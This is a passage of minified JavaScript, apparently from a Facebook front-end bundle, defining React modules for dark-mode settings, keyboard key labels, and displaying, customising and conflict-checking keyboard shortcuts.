        o = c("requireDeferredForDisplay")("cometPushToast").__setRef(
          "makeCometDarkModeStateProvider.react"
        ),
        p = {
          darkClassName: d("CometStyleXSheet").DARK_MODE_CLASS_NAME,
          darkVariables: {},
          lightClassName: d("CometStyleXSheet").LIGHT_MODE_CLASS_NAME,
          lightVariables: {},
        };
      function a(a) {
        var b = a.getDarkModeSetting,
          e = a.saveDarkModeSetting;
        function g(a) {
          a = a.children;
          var f = d("useSystemPrefersDarkMode").useSystemPrefersDarkMode(b),
            g = n(b),
            i = g[0],
            q = g[1],
            r = i === "ENABLED" || (i === "USE_SYSTEM" && f);
          d("useCometSetDarkModeMetaContent").useCometSetDarkModeMetaContent(r);
          var s = c("useCometRouterState")(),
            t = m(
              function () {
                if (s == null ? void 0 : s.pushViewStack)
                  for (var a = s.pushViewStack.length - 1; a >= 0; a--) {
                    var b = s.pushViewStack[a].route;
                    if (c("isRouteTransparent")(b)) continue;
                    if (((b = b.theme) == null ? void 0 : b.forceDarkMode) === !0)
                      return !0;
                    else return !1;
                  }
                else if (
                  (s == null
                    ? void 0
                    : (b = s.main) == null
                    ? void 0
                    : (a = b.route) == null
                    ? void 0
                    : (b = a.theme) == null
                    ? void 0
                    : b.forceDarkMode) === !0
                )
                  return !0;
                return !1;
              },
              [s]
            );
          g = m(
            function () {
              if (t) return "dark";
              return i === "USE_SYSTEM"
                ? "auto"
                : i === "ENABLED"
                ? "dark"
                : "light";
            },
            [i, t]
          );
          var u = k(function (a) {
            q(a), e(a, { onRevert: q });
          }, []);
          l(
            function () {
              if (t) {
                d("CometDarkModeRootClass").updateDarkModeRootClass("ENABLED");
                return function () {
                  d("CometDarkModeRootClass").updateDarkModeRootClass(i);
                };
              }
            },
            [t, i]
          );
          var v = k(
            function () {
              u(r ? "DISABLED" : "ENABLED");
            },
            [r, u]
          );
          f = m(
            function () {
              return {
                currentSetting: i,
                onDarkModeToggle: v,
                setDarkModeSetting: u,
              };
            },
            [i, v, u]
          );
          var w = r || t ? "dark" : "light",
            x = k(
              function () {
                v();
                var a = r
                  ? h._("__JHASH__mZUSsgKzhwX__JHASH__")
                  : h._("__JHASH__5t1YIaW-UDE__JHASH__");
                o.onReady(function (b) {
                  b = b.cometPushToast;
                  b({ message: a });
                });
              },
              [r, v]
            ),
            y = m(
              function () {
                if (!c("gkx")("425")) return [];
                var a = d("cometGetKeyCommandConfig").getCometKeyCommandConfig(
                  "global",
                  "toggleDarkMode",
                  x
                );
                return [a];
              },
              [x]
            );
          c("useGlobalKeyCommands")(y);
          return j.jsx(c("BaseThemeConfigContext").Provider, {
            value: p,
            children: j.jsx(c("BaseThemeDisplayModeContext").Provider, {
              value: w,
              children: j.jsx(c("CometDarkModeContext").Provider, {
                value: f,
                children: j.jsx(c("DSPDisplayModeContext").Provider, {
                  value: g,
                  children: a,
                }),
              }),
            }),
          });
        }
        g.displayName = g.name + " [from " + f.id + "]";
        return g;
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "CometDarkModeStateProvider.react",
    ["CometDarkMode", "makeCometDarkModeStateProvider.react", "react"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h;
      h || d("react");
      a = c("makeCometDarkModeStateProvider.react")({
        getDarkModeSetting: d("CometDarkMode").getDarkModeSetting,
        saveDarkModeSetting: d("CometDarkMode").saveDarkModeSetting,
      });
      g["default"] = a;
    },
    98
  );
  __d(
    "CometFBUncaughtErrorDeferred.react",
    ["deferredLoadComponent", "react", "requireDeferred"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h;
      h || d("react");
      a = c("deferredLoadComponent")(
        c("requireDeferred")("CometFBUncaughtError.react").__setRef(
          "CometFBUncaughtErrorDeferred.react"
        )
      );
      b = a;
      g["default"] = b;
    },
    98
  );
  __d(
    "getKeyboardKeyAsString",
    ["fbt", "CometKeys", "UserAgent", "translateKey"],
    function (a, b, c, d, e, f, g, h) {
      "use strict";
      var i, j;
      b = String.fromCodePoint(8594);
      d = String.fromCodePoint(8592);
      e = String.fromCodePoint(8593);
      f = String.fromCodePoint(8595);
      var k = String.fromCodePoint(8617),
        l = String.fromCodePoint(8629),
        m = String.fromCodePoint(8998),
        n = String.fromCodePoint(8679),
        o = String.fromCodePoint(8984),
        p = String.fromCodePoint(8997),
        q = String.fromCodePoint(8963),
        r = String.fromCodePoint(8677),
        s = babelHelpers["extends"](
          ((i = {}),
          (i[(j = c("CometKeys")).SPACE] = [
            "space",
            h._("__JHASH__ojx_8slmkSl__JHASH__"),
          ]),
          (i[j.QUESTION] = [j.QUESTION, h._("__JHASH__hHNIwGmtduS__JHASH__")]),
          (i[j.SLASH] = [j.SLASH, h._("__JHASH__GIXmY8P-GeY__JHASH__")]),
          (i[j.TAB] = [r, (h = c("translateKey"))("tab")]),
          (i.CapsLock = ["caps lock", h("caps_lock")]),
          (i.Dead = ["`", null]),
          (i.PageDown = ["page down", h("page_down")]),
          (i.PageUp = ["page up", h("page_up")]),
          (i.arrowdown = [f, h("down")]),
          (i.arrowleft = [d, h("left")]),
          (i.arrowright = [b, h("right")]),
          (i.arrowup = [e, h("up")]),
          (i.shift = [n, h("shift")]),
          i),
          c("UserAgent").isPlatform("Mac OS X")
            ? ((j = {}),
              (j[c("CometKeys").DELETE] = [
                "delete",
                c("translateKey")("delete"),
              ]),
              (j[c("CometKeys").DEL] = [m, c("translateKey")("forward_delete")]),
              (j[c("CometKeys").ENTER] = [k, c("translateKey")("enter")]),
              (j.Control = [q, c("translateKey")("ctrl")]),
              (j.alt = [p, c("translateKey")("opt")]),
              (j.command = [o, c("translateKey")("cmd")]),
              j)
            : ((r = {}),
              (r[c("CometKeys").ENTER] = [l, c("translateKey")("enter")]),
              (r.Meta = ["windows", null]),
              (r.alt = ["alt", c("translateKey")("alt")]),
              (r.command = ["ctrl", c("translateKey")("ctrl")]),
              r)
        );
      function a(a) {
        var b;
        return (b = s[a]) != null ? b : [a, null];
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "getKeyCombinationAsStringList",
    ["getKeyboardKeyAsString"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h = ["alt", "command", "shift"];
      function a(a) {
        var b = (a == null ? void 0 : a.key) != null ? a.key.toLowerCase() : null;
        b = b != null ? c("getKeyboardKeyAsString")(b) : null;
        var d = [],
          e = [];
        h.filter(function (b) {
          return (a == null ? void 0 : a[b]) === !0;
        })
          .map(function (a) {
            return c("getKeyboardKeyAsString")(a);
          })
          .concat(b != null ? [b] : [])
          .forEach(function (a) {
            var b = a[0];
            a = a[1];
            d.push(b);
            e.push((a = a) != null ? a : b);
          });
        return [d, e];
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "KeyBlocks.react",
    [
      "fbt",
      "CometScreenReaderText.react",
      "getKeyCombinationAsStringList",
      "intlList",
      "react",
      "stylex",
    ],
    function (a, b, c, d, e, f, g, h) {
      "use strict";
      var i,
        j,
        k = j || d("react"),
        l = {
          activeKey: { backgroundColor: "xtvsq51", color: "xtk6v10", $$css: !0 },
          disabledKey: {
            borderTopColor: "x1v8p93f",
            borderEndColor: "xogb00i",
            borderBottomColor: "x16stqrj",
            borderStartColor: "x1ftr3km",
            paddingEnd: "x4uap5",
            paddingLeft: null,
            paddingRight: null,
            paddingStart: "xkhd6sd",
            $$css: !0,
          },
          keyInfo: {
            borderTopColor: "x8cjs6t",
            borderEndColor: "x1ch86jh",
            borderBottomColor: "x80vd3b",
            borderStartColor: "xckqwgs",
            borderTopStartRadius: "xhk9q7s",
            borderTopEndRadius: "x1otrzb0",
            borderBottomEndRadius: "x1i1ezom",
            borderBottomStartRadius: "x1o6z2jb",
            borderTopStyle: "x13fuv20",
            borderEndStyle: "xu3j5b3",
            borderBottomStyle: "x1q0q8m5",
            borderStartStyle: "x26u7qi",
            borderTopWidth: "x178xt8z",
            borderEndWidth: "xm81vs4",
            borderBottomWidth: "xso031l",
            borderStartWidth: "xy80clv",
            boxSizing: "x9f619",
            display: "x1rg5ohu",
            lineHeight: "xo5v014",
            marginTop: "x7r5mf7",
            marginEnd: "xeyog9w",
            marginBottom: "xahult9",
            marginStart: "x1w4ip6v",
            minWidth: "x15byajp",
            paddingTop: "x1iorvi4",
            paddingEnd: "xsyo7zv",
            paddingBottom: "xjkvuk6",
            paddingStart: "x16hj40l",
            paddingLeft: null,
            paddingRight: null,
            textAlign: "x2b8uid",
            $$css: !0,
          },
          keyInfoLarge: {
            marginBottom: "xzueoph",
            marginTop: "x1k70j0n",
            $$css: !0,
          },
        };
      function a(a) {
        var b = a.command,
          d = a.displayType;
        a = a.isActive;
        var e = (i || (i = c("stylex")))(
          l.keyInfo,
          a === !0 && l.activeKey,
          d === "full" && l.keyInfoLarge
        );
        if (b.key === "")
          return k.jsx("span", {
            className: (i || (i = c("stylex")))(
              l.keyInfo,
              d === "full" && l.keyInfoLarge,
              l.disabledKey
            ),
            children: h._("__JHASH__2HY11o2ViTU__JHASH__"),
          });
        a = c("getKeyCombinationAsStringList")(b);
        d = a[0];
        b = a[1];
        return k.jsxs("span", {
          children: [
            k.jsx("span", {
              "aria-hidden": "true",
              children: d.map(function (a, b) {
                return k.jsxs(
                  k.Fragment,
                  {
                    children: [
                      b !== 0 ? " + " : null,
                      k.jsx("span", { className: e, children: a }),
                    ],
                  },
                  b
                );
              }),
            }),
            k.jsx(c("CometScreenReaderText.react"), {
              text: c("intlList")(b, c("intlList").CONJUNCTIONS.AND),
            }),
          ],
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "KeyInfo.react",
    [
      "CometKeyCommandSettingsContext",
      "CometPressable.react",
      "JSResourceForInteraction",
      "KeyBlocks.react",
      "TetraText.react",
      "createKeyCommand",
      "isSingleCharKey",
      "react",
      "stylex",
      "useCometLazyDialog",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i,
        j = i || (i = d("react"));
      b = i;
      var k = b.useContext,
        l = b.useRef,
        m = c("JSResourceForInteraction")("KeyBindDialog.react").__setRef(
          "KeyInfo.react"
        ),
        n = {
          compactDescriptionCellItem: {
            paddingEnd: "x1iji9kk",
            paddingLeft: null,
            paddingRight: null,
            $$css: !0,
          },
          descriptionCellItem: {
            paddingBottom: "xwib8y2",
            paddingEnd: "x6x52a7",
            paddingLeft: null,
            paddingRight: null,
            paddingTop: "x1y1aw1k",
            $$css: !0,
          },
          disabled: { color: "x1dntmbh", $$css: !0 },
          enabled: { color: "xzsf02u", $$css: !0 },
          keyBlock: {
            alignItems: "x6s0dn4",
            display: "x78zum5",
            flexWrap: "xozqiw3",
            whiteSpace: "xuxw1ft",
            $$css: !0,
          },
          keyCellItem: {
            textAlign: "xp4054r",
            whiteSpace: "xuxw1ft",
            "@media only screen and (max-width: 970px)_width": "x10vfum5",
            $$css: !0,
          },
          rowItem: {
            paddingTop: "xexx8yu",
            paddingEnd: "x4uap5",
            paddingBottom: "x18d9i69",
            paddingStart: "xkhd6sd",
            textAlign: "x1yc453h",
            $$css: !0,
          },
          tableCellItem: {
            fontSize: "x6prxxf",
            fontWeight: "x1pd3egz",
            lineHeight: "x1evy7pa",
            paddingBottom: "x10b6aqq",
            paddingTop: "x1yrsyyn",
            $$css: !0,
          },
        };
      function a(a) {
        var b = k(c("CometKeyCommandSettingsContext")),
          d = (b == null ? void 0 : b.getAreSingleKeysDisabled()) || !1,
          e = l(),
          f = a.command,
          g = a.commandID,
          i = a.description,
          o = a.displayType,
          p = a.groupID,
          q = a.index,
          r = a.isActive,
          s = a.keyCommand,
          t = c("useCometLazyDialog")(m),
          u = t[0];
        t = f;
        s = s;
        p != null &&
          g != null &&
          ((t = b.getCustomKeyCombination(p, g) || t),
          (s = c("createKeyCommand")(t)));
        b = c("isSingleCharKey")(s);
        d = d && b;
        b = s != null && q != null ? s + "_" + q + "_" + (d ? "1" : "0") : t.key;
        switch (o) {
          case "compact":
          case "full":
            return j.jsxs(
              "tr",
              {
                className: (h || (h = c("stylex")))(
                  n.rowItem,
                  d && n.disabled,
                  !d && n.enabled
                ),
                ref: e,
                children: [
                  j.jsx("th", {
                    className: (h || (h = c("stylex")))(
                      n.tableCellItem,
                      o === "full" && n.descriptionCellItem,
                      o === "compact" && n.compactDescriptionCellItem
                    ),
                    children: j.jsx(c("TetraText.react"), {
                      color: a.disabled === !0 ? "disabled" : "primary",
                      type: "body3",
                      children: i,
                    }),
                  }),
                  j.jsx("td", {
                    className:
                      "x6prxxf x1pd3egz x1evy7pa x10b6aqq x1yrsyyn xp4054r xuxw1ft x10vfum5",
                    children: j.jsx(c("TetraText.react"), {
                      color: a.disabled === !0 ? "disabled" : "primary",
                      type: o === "full" ? "body3" : "body4",
                      children:
                        a.editable === !0 && p != null && g != null
                          ? j.jsx(c("CometPressable.react"), {
                              onPress: function () {
                                u({
                                  commandID: g,
                                  defaultCommand: f,
                                  groupID: p,
                                });
                              },
                              overlayOffset: {
                                bottom: 0,
                                left: 4,
                                right: 4,
                                top: 0,
                              },
                              overlayRadius: 8,
                              children: j.jsx(c("KeyBlocks.react"), {
                                command: t,
                                displayType: o,
                                isActive: r,
                              }),
                            })
                          : j.jsx(c("KeyBlocks.react"), {
                              command: t,
                              displayType: o,
                              isActive: r,
                            }),
                    }),
                  }),
                ],
              },
              b
            );
          default:
            return j.jsxs("div", {
              className: "x6s0dn4 x78zum5 xozqiw3 xuxw1ft",
              ref: e,
              children: [
                j.jsx("span", { children: i }),
                j.jsx(c("KeyBlocks.react"), {
                  command: t,
                  displayType: o,
                  isActive: r,
                }),
              ],
            });
        }
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "KeyInfoList.react",
    [
      "fbt",
      "CometScreenReaderText.react",
      "KeyInfo.react",
      "isSingleCharKey",
      "react",
    ],
    function (a, b, c, d, e, f, g, h) {
      "use strict";
      var i,
        j = i || d("react");
      function a(a) {
        var b = a.commands,
          d = a.isFullTable,
          e = [],
          f = -1;
        if (b != null) {
          var g = Array.from(b.keys()),
            i = Array.from(b.values());
          i = i.some(function (a) {
            return "order" in a[0];
          });
          i
            ? g.sort(function (a, c) {
                a = (a = b.get(a)) != null ? a : [{}];
                c = (c = b.get(c)) != null ? c : [{}];
                a = (a = a[0].order) != null ? a : 99999;
                c = (c = c[0].order) != null ? c : 99999;
                return a - c;
              })
            : g.sort(function (a, b) {
                if (a < b) return -1;
                return b > a ? 1 : 0;
              });
          g.forEach(function (h, i) {
            var k = b.get(h);
            k &&
              k.forEach(function (b, l) {
                f++;
                if (
                  b.isHiddenCommand ||
                  b.command == null ||
                  (a.hideSingleCharKeys === !0 && c("isSingleCharKey")(h))
                )
                  return;
                var m = i === g.length - 1 && l === k.length - 1;
                return e.push(
                  j.jsx(
                    c("KeyInfo.react"),
                    {
                      command: b.command,
                      commandID: b.commandID,
                      description: b.description,
                      disabled: a.disabled,
                      displayType: d ? "full" : "compact",
                      editable: a.editable,
                      groupID: b.groupID,
                      index: l,
                      isEndOfList: m,
                      keyCommand: h,
                    },
                    f
                  )
                );
              });
          });
        }
        return j.jsx("table", {
          cellSpacing: "0",
          className: "xh8yej3",
          children: j.jsxs("tbody", {
            children: [
              j.jsxs("tr", {
                children: [
                  j.jsx("th", {
                    children: j.jsx(c("CometScreenReaderText.react"), {
                      text: h._("__JHASH__1BT0m5idyS-__JHASH__"),
                    }),
                  }),
                  j.jsx("th", {
                    children: j.jsx(c("CometScreenReaderText.react"), {
                      text: h._("__JHASH__M6bYqjYXV2x__JHASH__"),
                    }),
                  }),
                ],
              }),
              e,
            ],
          }),
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometCompactKeyCommandDisplay.react",
    [
      "fbt",
      "ix",
      "BaseFocusRing.react",
      "CometKeyCommandSettingsContext",
      "CometKeyCommandUtilsContext",
      "CometRow.react",
      "CometRowItem.react",
      "FocusWithinHandler.react",
      "KeyInfoList.react",
      "TetraButtonGroup.react",
      "TetraCircleButton.react",
      "TetraText.react",
      "fbicon",
      "gkx",
      "react",
      "stylex",
    ],
    function (a, b, c, d, e, f, g, h, i) {
      "use strict";
      var j,
        k,
        l = k || (k = d("react"));
      b = k;
      var m = b.useContext,
        n = b.useEffect,
        o = b.useRef,
        p = b.useState;
      function a(a) {
        var b = a.onExpand,
          e = a.onHide,
          f = a.onReturnFocus,
          g = o(!1),
          k = o(!1),
          q = o(!1);
        a = p(null);
        var r = a[0],
          s = a[1];
        a = m(c("CometKeyCommandSettingsContext"));
        var t = a.getAreSingleKeysDisabled,
          u = m(c("CometKeyCommandUtilsContext"));
        n(
          function () {
            var a = u && u.addObserver;
            if (a) {
              var b = a(function (a) {
                if (a.type === "update") {
                  if (k.current) return;
                  a = b.getActiveCommands();
                  a !== r && s(a);
                  return;
                }
              });
              g.current || (s(b.getActiveCommands()), (g.current = !0));
              return function () {
                b.remove();
              };
            }
          },
          [r, k, u]
        );
        return l.jsx("div", {
          className:
            "x1ey2m1c x9f619 xds687c x889kno x1iji9kk x1a8lsjc x1sln4lm xixxii4 x1fwfoet",
          children: l.jsx("div", {
            "aria-describedby": "pinned-key-command-display-description",
            "aria-label": h._("__JHASH__Pug1Hw5TNXc__JHASH__"),
            className:
              "x1ve1bff x1lq5wgf xgqcy7u x30kzoy x9jhf4c x104qc98 x9f619 xzsf02u x78zum5 xh8yej3 xzkaem6",
            role: "dialog",
            children: l.jsx(c("FocusWithinHandler.react"), {
              onBlurWithin: function () {
                k.current = !1;
              },
              onFocusWithin: function () {
                k.current = !0;
              },
              children: function (a, g) {
                return l.jsxs("div", {
                  className: "xh8yej3",
                  children: [
                    l.jsx("div", {
                      className: "xdppsyt x889kno x1pi30zi x1a8lsjc x1swvt13",
                      id: "pinned-key-command-display-title",
                      children: l.jsxs("div", {
                        className: "x6s0dn4 x78zum5 x6prxxf xh8yej3 x1s688f",
                        children: [
                          l.jsx(c("BaseFocusRing.react"), {
                            children: function (a) {
                              return l.jsx("div", {
                                className: (j || (j = c("stylex")))(a),
                                children: l.jsx(c("CometRow.react"), {
                                  paddingHorizontal: 0,
                                  paddingTop: 0,
                                  verticalAlign: "center",
                                  children: l.jsx(c("CometRowItem.react"), {
                                    children: l.jsx(c("TetraText.react"), {
                                      isSemanticHeading: !0,
                                      type: "headlineEmphasized3",
                                      children: h._(
                                        "__JHASH__2hQprPyWinW__JHASH__"
                                      ),
                                    }),
                                  }),
                                }),
                              });
                            },
                          }),
                          l.jsx("div", { className: "x1iyjqo2" }),
                          l.jsx(c("CometRow.react"), {
                            paddingHorizontal: 0,
                            paddingTop: 0,
                            spacing: 8,
                            verticalAlign: "center",
                            children: l.jsx(c("CometRowItem.react"), {
                              children: l.jsx(c("TetraCircleButton.react"), {
                                icon: d("fbicon")._(i("478231"), 12),
                                label: h._("__JHASH__V7OGCpcsnd0__JHASH__"),
                                onPress: e,
                                onPressIn: function () {
                                  a && g && (q.current = !0);
                                },
                                onPressOut: function () {
                                  q.current = !1;
                                },
                                size: 24,
                              }),
                            }),
                          }),
                        ],
                      }),
                    }),
                    l.jsxs("div", {
                      className: "xyamay9 x1pi30zi x18d9i69 x1swvt13",
                      children: [
                        l.jsx("div", {
                          className: "xyorhqc",
                          id: "pinned-key-command-display-description",
                          children: l.jsx(c("TetraText.react"), {
                            type: "meta3",
                            children: c("gkx")("1224637")
                              ? h._("__JHASH__d9fYSB_Nc4H__JHASH__")
                              : h._("__JHASH__BbGk_f7II94__JHASH__"),
                          }),
                        }),
                        l.jsx("ul", {
                          className: "x78zum5 x1iyjqo2 x1a02dak x6prxxf xk50ysn",
                          children: l.jsx(c("KeyInfoList.react"), {
                            commands: r,
                            hideSingleCharKeys: t(),
                            isFullTable: !1,
                          }),
                        }),
                      ],
                    }),
                    l.jsx("div", {
                      className: "x1l90r2v x150jy0e x1e558r4",
                      children: l.jsx(c("TetraButtonGroup.react"), {
                        primary: {
                          label: h._("__JHASH__Y4wbXy7wwnT__JHASH__"),
                          onPress: b,
                          onPressIn: function () {
                            a && g && (q.current = !0);
                          },
                          onPressOut: function () {
                            q.current = !1;
                          },
                          reduceEmphasis: !0,
                        },
                        secondary:
                          (a && g) || q.current
                            ? {
                                label: h._("__JHASH__KscRtnRQeMH__JHASH__"),
                                onPress: f,
                              }
                            : null,
                        wrap: "forward",
                      }),
                    }),
                  ],
                });
              },
            }),
          }),
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometSearchKeyCommandWidget",
    ["createKeyCommandWidget"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      a = c("createKeyCommandWidget")();
      g["default"] = a;
    },
    98
  );
  __d(
    "CometSearchKeyCommandWrapper.react",
    ["CometSearchKeyCommandWidget", "react"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || d("react");
      function a(a) {
        var b = a.children;
        a = babelHelpers.objectWithoutPropertiesLoose(a, ["children"]);
        return i.jsx(
          c("CometSearchKeyCommandWidget").Wrapper,
          babelHelpers["extends"]({}, a, { children: b })
        );
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometKeyCommandNub.react",
    [
      "fbt",
      "CometCompactKeyCommandDisplay.react",
      "CometHideLayerOnEscape.react",
      "CometKeyCommandSettingsContext",
      "CometSearchKeyCommandWrapper.react",
      "FocusManager",
      "FocusRegion.react",
      "FocusWithinHandler.react",
      "JSResourceForInteraction",
      "cometGetKeyCommandConfig",
      "focusScopeQueries",
      "react",
      "setTimeout",
      "useCometLazyDialog",
      "useGlobalKeyCommands",
    ],
    function (a, b, c, d, e, f, g, h) {
      "use strict";
      var i,
        j = i || (i = d("react"));
      b = i;
      var k = b.useCallback,
        l = b.useContext,
        m = b.useMemo,
        n = b.useRef,
        o = c("JSResourceForInteraction")(
          "CometKeyShortcutDialog.react"
        ).__setRef("CometKeyCommandNub.react"),
        p = JSON.stringify({
          "?": h._("__JHASH__JFzz0Kaz2tG__JHASH__"),
          "/": h._("__JHASH__cQLPlZwdPlE__JHASH__"),
          c: h._("__JHASH__P15Rudw6Tkk__JHASH__"),
          enter: h._("__JHASH__QXxNAUTeCwM__JHASH__"),
          f: h._("__JHASH__-zXWEGggwq2__JHASH__"),
          j: h._("__JHASH__WndJIhg7mkd__JHASH__"),
          k: h._("__JHASH__1iDIlV-v0Mf__JHASH__"),
          l: h._("__JHASH__L3O6fYRVjgd__JHASH__"),
          o: h._("__JHASH__m9B-iG5-MNK__JHASH__"),
          p: h._("__JHASH__Hl2XVsbCUgj__JHASH__"),
          q: h._("__JHASH__DiOB5clDycO__JHASH__"),
          s: h._("__JHASH__SzQfhTIuxw6__JHASH__"),
        });
      function a() {
        var a = l(c("CometKeyCommandSettingsContext")),
          b = a.isViewerShowing,
          e = a.setViewerInfo,
          f = a.viewerType;
        a = c("useCometLazyDialog")(o);
        var g = a[0],
          h = n(null),
          i = n(!1),
          q = k(
            function () {
              f === "pinned" &&
                i.current &&
                h.current != null &&
                d("FocusManager").focusElement(h.current, { preventScroll: !0 });
            },
            [f]
          );
        a = k(
          function () {
            e(!1, f), q();
          },
          [q, e, f]
        );
        var r = k(
            function () {
              e(!0, "see_all"), g({}, function () {});
            },
            [e, g]
          ),
          s = k(
            function () {
              !b
                ? f === "see_all"
                  ? r()
                  : ((h.current = document.activeElement),
                    e(!0, f),
                    c("setTimeout")(function () {
                      return d("FocusRegion.react").focusRegionById(
                        "KeyboardShortcutNubRegion",
                        d("focusScopeQueries").tabbableScopeQuery
                      );
                    }, 0))
                : f === "pinned" &&
                  ((h.current = document.activeElement),
                  d("FocusRegion.react").focusRegionById(
                    "KeyboardShortcutNubRegion",
                    d("focusScopeQueries").tabbableScopeQuery
                  ));
            },
            [b, e, r, f]
          ),
          t = m(
            function () {
              return [
                d("cometGetKeyCommandConfig").getCometAndGeminiKeyCommandConfig(
                  "global",
                  "toggleNub",
                  s
                ),
                d("cometGetKeyCommandConfig").getCometAndGeminiKeyCommandConfig(
                  "global",
                  "toggleNubFunctionKey",
                  s
                ),
              ];
            },
            [s]
          );
        c("useGlobalKeyCommands")(t);
        t =
          b && f === "pinned"
            ? j.jsx(c("CometCompactKeyCommandDisplay.react"), {
                onExpand: r,
                onHide: a,
                onReturnFocus: q,
              })
            : null;
        return j.jsx(d("FocusRegion.react").FocusRegion, {
          containFocusQuery: d("focusScopeQueries").tabbableScopeQuery,
          id: "KeyboardShortcutNubRegion",
          children: j.jsx(c("CometSearchKeyCommandWrapper.react"), {
            children: j.jsx(c("FocusWithinHandler.react"), {
              onBlurWithin: function () {
                i.current = !1;
              },
              onFocusWithin: function () {
                i.current = !0;
              },
              children: j.jsxs(c("CometHideLayerOnEscape.react"), {
                debugName: "KeyCommandNubESC",
                onHide: a,
                children: [t, j.jsx("div", { "data-at-shortcutkeys": p })],
              }),
            }),
          }),
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "KeyboardShortcutViewerActivityFalcoEvent",
    ["FalcoLoggerInternal", "getFalcoLogPolicy_DO_NOT_USE"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      a = c("getFalcoLogPolicy_DO_NOT_USE")("1789755");
      b = d("FalcoLoggerInternal").create("keyboard_shortcut_viewer_activity", a);
      e = b;
      g["default"] = e;
    },
    98
  );
  __d(
    "SetAreSingleKeysDisabledSetting",
    [
      "CometRelay",
      "SetAreSingleKeysDisabledSettingCometCometCustomKeyCommandsMutation.graphql",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h;
      function a(a) {
        var c = a.environment;
        a = a.input;
        d("CometRelay").commitMutation(c, {
          mutation:
            h !== void 0
              ? h
              : (h = b(
                  "SetAreSingleKeysDisabledSettingCometCometCustomKeyCommandsMutation.graphql"
                )),
          variables: a,
        });
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "SingleKeyShortcutsDisabledFalcoEvent",
    ["FalcoLoggerInternal", "getFalcoLogPolicy_DO_NOT_USE"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      a = c("getFalcoLogPolicy_DO_NOT_USE")("1785927");
      b = d("FalcoLoggerInternal").create("single_key_shortcuts_disabled", a);
      e = b;
      g["default"] = e;
    },
    98
  );
  __d(
    "checkForKeyCommandConflictUtil",
    ["fbt", "CometDefaultKeyCommands", "areKeyCombinationsEqual"],
    function (a, b, c, d, e, f, g, h) {
      "use strict";
      var i = function (a, b) {
          var d;
          return h._("__JHASH__wZUmiZR2EZl__JHASH__", [
            h._param(
              "command_key_description",
              c("CometDefaultKeyCommands") == null
                ? void 0
                : (d = c("CometDefaultKeyCommands")[a]) == null
                ? void 0
                : (d = d.shortcuts) == null
                ? void 0
                : d[b].description
            ),
            h._param(
              "command_key_group",
              c("CometDefaultKeyCommands") == null
                ? void 0
                : (d = c("CometDefaultKeyCommands")[a]) == null
                ? void 0
                : d.label
            ),
          ]);
        },
        j = function (a) {
          return a === "global"
            ? Object.keys(c("CometDefaultKeyCommands"))
            : [a, "global"];
        };
      function a(a, b, d, e) {
        var f = [];
        for (
          var b = j(b),
            g = Array.isArray(b),
            h = 0,
            b = g
              ? b
              : b[
                  typeof Symbol === "function" ? Symbol.iterator : "@@iterator"
                ]();
          ;
  
        ) {
          var k, l;
          if (g) {
            if (h >= b.length) break;
            l = b[h++];
          } else {
            h = b.next();
            if (h.done) break;
            l = h.value;
          }
          l = l;
          k = Object.keys(
            ((k = c("CometDefaultKeyCommands")[l]) == null
              ? void 0
              : k.shortcuts) || {}
          );
          for (var m = 0; m < k.length; m++) {
            var n,
              o = k[m];
            if (o === d) continue;
            n =
              ((n = a[l]) == null ? void 0 : n[o]) ||
              (c("CometDefaultKeyCommands") == null
                ? void 0
                : (n = c("CometDefaultKeyCommands")[l]) == null
                ? void 0
                : (n = n.shortcuts) == null
                ? void 0
                : n[o].command);
            n &&
              c("areKeyCombinationsEqual")(n, e) &&
              f.push({ commandID: o, description: i(l, o), groupID: l });
          }
        }
        return f;
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "useCustomCommandsState",
    [
      "CometCustomKeyCommands",
      "CometDefaultKeyCommands",
      "CometRelayEnvironment",
      "checkForKeyCommandConflictUtil",
      "cr:4039",
      "cr:4040",
      "cr:4041",
      "createKeyCommand",
      "gkx",
      "react",
      "useStable",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h;
      e = h || d("react");
      var i = e.useCallback,
        j = e.useRef,
        k = { alt: !1, command: !1, key: "", shift: !1 };
      function l() {
        var a = new Map(),
          b = c("CometCustomKeyCommands").customCommands,
          d = Object.keys(b);
        for (var e = 0; e < d.length; e++) {
          var f = d[e];
          if (b[f]) {
            var g = Object.keys(b[f]);
            for (var h = 0; h < g.length; h++) {
              var i,
                j = g[h];
              i = (i = b[f]) == null ? void 0 : i[j];
              i &&
                a.set(c("createKeyCommand")(i), {
                  command: i,
                  commandID: j,
                  description: "",
                  groupID: f,
                });
            }
          }
        }
        return a;
      }
      function a() {
        var a = c("CometRelayEnvironment"),
          d = j(
            c("gkx")("6950") ? c("CometCustomKeyCommands").customCommands : {}
          ),
          e = c("useStable")(function () {
            return l();
          }),
          f = i(
            function (a, b) {
              a = (a = d.current[a]) == null ? void 0 : a[b];
              a != null && e["delete"](c("createKeyCommand")(a));
            },
            [e, d]
          ),
          g = i(
            function (a, b, e) {
              return c("checkForKeyCommandConflictUtil")(d.current, a, b, e);
            },
            [d]
          ),
          h = i(
            function (c, e) {
              var g;
              if (!b("cr:4039")) return;
              b("cr:4039")({ command_id: e, group_id: c, key_combination: k }, a);
              f(c, e);
              d.current = babelHelpers["extends"](
                {},
                d.current,
